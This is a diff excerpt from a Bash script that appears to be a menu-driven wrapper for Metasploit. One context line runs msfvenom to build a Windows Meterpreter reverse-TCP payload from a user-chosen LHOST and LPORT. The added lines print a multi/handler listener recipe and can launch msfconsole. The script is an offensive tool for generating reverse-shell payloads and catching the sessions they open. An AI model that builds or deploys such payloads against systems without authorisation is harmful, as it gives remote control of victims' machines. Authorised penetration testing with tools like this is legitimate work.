@@ -150,9 +150,31 @@ read -p "Language(ex. py): " lang2
 msfvenom -p windows/meterpreter/reverse_tcp LHOST=$ip LPORT=$port -f $lang2
 ;;
 esac
-fi
-}
 
+elif [ "$choice" -eq 6 ]
+then
+echo "
+Metasploit Handler Guide
+=========================
+use exploit/multi/handler
+set PAYLOAD <Payload name>
+set LHOST <LHOST value>
+set LPORT <LPORT value>
+set ExitOnSession false
+exploit -j -z
+"
+read -p "Do you wish to start Metasploit(y=1/n=0)~: " yon
+if [ "$yon" -eq 1 ]
+then
+msfconsole
+elif [[ "$yon" -eq 0 ]];then
+echo "Exiting..."
+sleep 1.5
+exit
+fi
+fi
+
+}
 function main() {
 banner
 payload
